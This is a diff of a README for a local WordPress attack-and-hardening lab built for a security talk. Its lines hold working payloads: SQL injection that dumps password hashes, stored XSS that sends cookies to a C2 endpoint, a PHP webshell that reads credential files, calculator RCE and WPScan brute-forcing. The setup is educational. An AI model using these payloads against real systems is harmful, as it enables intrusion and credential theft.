@@ -3,24 +3,44 @@
 > DEV.BG Cyber Security User Group — 20.04.2026  
 > Speaker: Nedko Hristov, Senior DevOps Engineer @ Nemetschek Bulgaria
 
+## Main Reference
+
+**[`presentation-demo-execution.md`](presentation-demo-execution.md)** — the primary guide for running all 16 demo sections. Covers every attack command, expected output, talking points, and section reset commands. Start here.
+
 ## Quick Start
 
 ```bash
-# 1. Start the stack
+# 1. Build and start the core stack
 docker compose up -d --build
 
-# 2. Wait ~30 seconds for WordPress to initialize, then run setup
+# 2. Run the setup script — installs WordPress, creates demo users,
+#    activates plugins (wp-vuln-demo, WooCommerce, Redis Object Cache),
+#    seeds demo content and revision bloat for Section 12
 docker compose exec wordpress wp-setup.sh
 
 # 3. Open WordPress
-open http://localhost:8080          # Frontend
-open http://localhost:8080/wp-admin # Admin (admin / admin123)
+open http://localhost:8080           # Frontend
+open http://localhost:8080/wp-admin  # Admin panel — user: admin / admin123
 
-# 4. Start the attacker tools (WPScan + C2 server)
+# 4. (Optional) Start attacker tools — WPScan scanner + Flask C2 server
+#    Required for Sections 3 (XSS/cookie theft) and 8 (WPScan)
 docker compose --profile tools up -d
 
-# 5. Check attacker C2 dashboard
+# 5. Open attacker C2 dashboard
 open http://localhost:9090
+```
+
+> The setup script is idempotent — safe to re-run. It handles everything including WooCommerce and Redis Object Cache activation.
+
+### Seed demo bloat and record the baseline (Section 12)
+
+```bash
+# Seed all 8 bloat categories (25 000+ revisions, 1 000 WooCommerce products,
+# 800 transients, 750 spam comments, 4 500 orphaned meta rows, …)
+docker compose exec wordpress wp-bloat.sh
+
+# Record the "before" performance baseline
+docker compose exec wordpress wp-perf-test.sh before
 ```
 
 ## Architecture
@@ -40,8 +60,10 @@ open http://localhost:9090
 ┌──────────────┐     ┌──────────────┐
 │   WPScan     │     │  Attacker    │
 │  (scanner)   │     │  C2 Server   │
-│              │     │  :9090       │
-└──────────────┘     └──────────────┘
+│  profile:    │     │  :9090       │
+│  tools       │     │  profile:    │
+└──────────────┘     │  tools       │
+                     └──────────────┘
 ```
 
 ## What's Included
@@ -61,11 +83,11 @@ open http://localhost:9090
 
 ### Nulled Theme Demo (`nulled-theme-demo`)
 
-Demonstrates 4 types of backdoors found in pirated themes:
-1. Obfuscated eval() via "license check" parameter
-2. Hidden admin user auto-creation
+Demonstrates 3 types of backdoors found in pirated themes and a live webshell:
+1. Obfuscated `eval()` disguised as a license-key check
+2. Hidden admin account auto-creation on every `init`
 3. Phone-home / data exfiltration to attacker C2
-4. Webshell hidden in `social-icons.php`
+4. Webshell hidden in `social-icons.php` — directly web-accessible, no WordPress bootstrap required
 
 ### Security Hardened Plugin (`wp-security-hardened`)
 
@@ -75,142 +97,81 @@ Activate this plugin to demonstrate the "after" state:
 - Adds security headers (CSP, X-Frame-Options, etc.)
 - Generic login error messages
 - Disables XML-RPC
-- Blocks PHP execution in uploads
+- Logs failed login attempts to `wp-content/debug.log`
 
-## Demo Walkthrough
+### Config Comparisons
 
-### Demo 1: Enumeration (5 min)
+| File | Purpose |
+|---|---|
+| `config/php-demo.ini` | Insecure PHP settings (default for demos) |
+| `config/php-hardened.ini` | Hardened settings — `disable_functions`, `open_basedir`, `HttpOnly` cookies |
+| `config/nginx-hardened.conf` | Rate limiting, block PHP in uploads, security headers, CSP |
 
-```bash
-# Username via REST API
-curl -s http://localhost:8080/wp-json/wp/v2/users | python3 -m json.tool
+## WPScan
 
-# Username via author param
-curl -sI 'http://localhost:8080/?author=1' | grep -i location
-
-# WordPress version
-curl -s http://localhost:8080 | grep generator
-
-# Server info leak
-curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_debug_info' | python3 -m json.tool
-```
-
-### Demo 2: SQL Injection (5 min)
+Add your own API token to `docker-compose.yml` under the `wpscan` service (`WPSCAN_API_TOKEN`) to get CVE lookups against the WPScan vulnerability database.
 
 ```bash
-# Normal search
-curl -s 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search&q=Welcome' | python3 -m json.tool
-
-# Extract all usernames + password hashes
-curl -s "http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search&q=1'+UNION+SELECT+user_login,user_pass,user_email+FROM+wp_users--+-" | python3 -m json.tool
-
-# Show the fixed version is safe
-curl -s "http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_search_fixed&q=1'+UNION+SELECT+1,2,3--" | python3 -m json.tool
-```
-
-### Demo 3: XSS + Cookie Theft (5 min)
-
-```bash
-# Start the attacker C2 server (if not already running)
-docker compose --profile tools up -d attacker
-
-# Inject stored XSS into guestbook
-curl -d 'action=vuln_guestbook_submit&name=Visitor&message=<script>fetch("http://localhost:9090/steal?c="%2Bdocument.cookie)</script>' \
-  http://localhost:8080/wp-admin/admin-ajax.php
-
-# Now visit the vuln-demo admin page as admin → cookie gets stolen
-# Check the loot:
-curl -s http://localhost:9090/loot | python3 -m json.tool
-```
-
-### Demo 4: File Upload → Webshell (5 min)
-
-```bash
-# Create webshell
-echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
-
-# Upload it
-curl -F 'file=@/tmp/shell.php' 'http://localhost:8080/wp-admin/admin-ajax.php?action=vuln_upload'
-
-# Execute commands
-curl http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=id
-curl http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=cat+/etc/passwd
-curl 'http://localhost:8080/wp-content/uploads/vuln-demo/shell.php?cmd=cat+/var/www/html/wp-config.php'
-```
-
-### Demo 5: RCE via Calculator (3 min)
-
-```bash
-# Normal use
-curl -d 'action=vuln_calculator&expression=2%2B2' http://localhost:8080/wp-admin/admin-ajax.php
-
-# RCE!
-curl -d 'action=vuln_calculator&expression=system(%27id%27)' http://localhost:8080/wp-admin/admin-ajax.php
-curl -d 'action=vuln_calculator&expression=system(%27cat+/etc/passwd%27)' http://localhost:8080/wp-admin/admin-ajax.php
-
-# Fixed version blocks it
-curl -d 'action=vuln_calculator_fixed&expression=system(%27id%27)' http://localhost:8080/wp-admin/admin-ajax.php
-```
-
-### Demo 6: WPScan (3 min)
-
-```bash
+# Enumerate users, vulnerable plugins and themes
 docker compose --profile tools run --rm wpscan \
   --url http://wordpress \
+  --force \
   --enumerate u,vp,vt \
+  --no-banner
+
+# Brute-force passwords for enumerated users
+docker compose --profile tools run --rm wpscan \
+  --url http://wordpress \
+  --force \
+  --enumerate u \
+  --passwords /tmp/passwords.txt \
   --no-banner
 ```
 
-### Demo 7: Integrity Check (2 min)
+> `--force` is required because WordPress's `siteurl` is `http://localhost:8080` — WPScan follows the redirect to a host unreachable from inside Docker and otherwise aborts. `--force` skips that detection check.
+
+## Reset Commands
 
 ```bash
-# Modify a core file
-docker compose exec wordpress bash -c "echo '<!-- hacked -->' >> /var/www/html/wp-includes/version.php"
+# Reset guestbook (Section 3 — stored XSS)
+docker compose exec wordpress wp eval 'global $wpdb; $wpdb->query("TRUNCATE TABLE wp_vuln_guestbook");' --allow-root
 
-# Detect the change
-docker compose exec wordpress wp core verify-checksums --allow-root
+# Clear attacker C2 loot (Section 3)
+docker compose exec attacker bash -c 'echo "[]" > /app/loot.json'
 
-# Fix it
+# Delete uploaded webshell (Section 6)
+docker compose exec wordpress rm -f /tmp/shell.php /var/www/html/wp-content/uploads/vuln-demo/shell.php
+
+# Restore tampered core file (Section 15)
 docker compose exec wordpress wp core download --force --allow-root
-```
 
-### Demo 8: DB Hygiene (3 min)
+# Remove read-only constants set in Section 14
+docker compose exec wordpress wp config delete DISALLOW_FILE_EDIT --allow-root || true
+docker compose exec wordpress wp config delete DISALLOW_FILE_MODS --allow-root || true
 
-```bash
-# Run hygiene queries
-docker compose exec db mysql -u wpuser -pwppassword wordpress < demos/db-hygiene-queries.sql
-
-# Or via wp-cli
-docker compose exec wordpress wp db query \
-  "SELECT option_name, LENGTH(option_value) as size FROM wp_options WHERE autoload='yes' ORDER BY size DESC LIMIT 10;" \
-  --allow-root
-```
-
-## Cleanup
-
-```bash
-# Stop everything
-docker compose --profile tools down
-
-# Remove all data (volumes)
-docker compose --profile tools down -v
+# Full reset — wipe everything and rebuild from scratch
+docker compose down -v && docker compose up -d --build
+docker compose exec wordpress wp-setup.sh
+docker compose exec wordpress wp-bloat.sh
+docker compose exec wordpress wp-perf-test.sh before
 ```
 
 ## File Structure
 
 ```
 .
-├── docker-compose.yml          # Main stack
-├── Dockerfile.wordpress        # WP image with WP-CLI + Redis
-├── Dockerfile.attacker         # Python Flask C2 server
-├── PRESENTATION_OUTLINE.md     # Full talk outline & brainstorming
-├── README.md                   # This file
+├── docker-compose.yml                  # Core stack + attacker tools (profile: tools)
+├── Dockerfile.wordpress                # WordPress image with WP-CLI, Redis, scripts
+├── Dockerfile.attacker                 # Python Flask C2 server
+├── presentation-demo-execution.md      # ★ Main demo guide — start here
+├── PRESENTATION_OUTLINE.md             # Full talk outline
+├── README.md                           # This file
 ├── config/
-│   ├── php-demo.ini            # Insecure PHP config (default)
-│   ├── php-hardened.ini        # Hardened PHP config (swap to demo)
-│   └── nginx-hardened.conf     # Hardened Nginx config example
+│   ├── php-demo.ini                    # Insecure PHP config (default)
+│   ├── php-hardened.ini                # Hardened PHP config (Section 10)
+│   └── nginx-hardened.conf             # Hardened Nginx config (Section 13)
 ├── plugins/
-│   ├── wp-vuln-demo/           # Intentionally vulnerable plugin
+│   ├── wp-vuln-demo/                   # Intentionally vulnerable plugin
 │   │   ├── wp-vuln-demo.php
 │   │   └── includes/
 │   │       ├── class-sqli-demo.php
@@ -220,22 +181,25 @@ docker compose --profile tools down -v
 │   │       ├── class-file-upload-demo.php
 │   │       ├── class-rce-demo.php
 │   │       └── class-enumeration-demo.php
-│   └── wp-security-hardened/   # Hardening plugin (the "fix")
+│   └── wp-security-hardened/           # Hardening plugin — the "after" state
 │       └── wp-security-hardened.php
 ├── themes/
-│   └── nulled-theme-demo/      # Simulated nulled theme with backdoors
-│       ├── functions.php
+│   └── nulled-theme-demo/              # Simulated backdoored nulled theme
+│       ├── functions.php               # 3 backdoor types (obfuscated eval, hidden admin, exfil)
 │       ├── style.css
 │       ├── index.php
-│       └── social-icons.php    # Hidden webshell demo
+│       └── social-icons.php            # Live webshell — web-accessible, no auth
 ├── demos/
-│   ├── attack-playbook.sh      # Step-by-step attack commands
-│   ├── csrf-attack.html        # CSRF attack page
-│   ├── passwords.txt           # Password list for brute force demo
-│   └── db-hygiene-queries.sql  # Database optimization queries
+│   ├── attack-playbook.sh              # Condensed attack command reference
+│   ├── csrf-attack.html                # CSRF attack page (Section 4)
+│   ├── passwords.txt                   # Wordlist for WPScan brute-force (Section 8)
+│   └── db-hygiene-queries.sql          # Full set of DB hygiene queries (Section 12)
 └── scripts/
-    ├── wp-setup.sh             # WordPress initial setup
-    └── attacker_server.py      # Cookie stealing C2 server
+    ├── wp-setup.sh                     # WordPress install + demo content seeding
+    ├── wp-bloat.sh                     # Seeds 8 categories of DB bloat (Section 12)
+    ├── wp-cleanup.sh                   # Runs all hygiene fixes, prints before/after
+    ├── wp-perf-test.sh                 # TTFB benchmark — before/after/redis modes
+    └── attacker_server.py              # Flask C2 server — /steal, /exfil, /loot endpoints
 ```
 
 ## Disclaimer
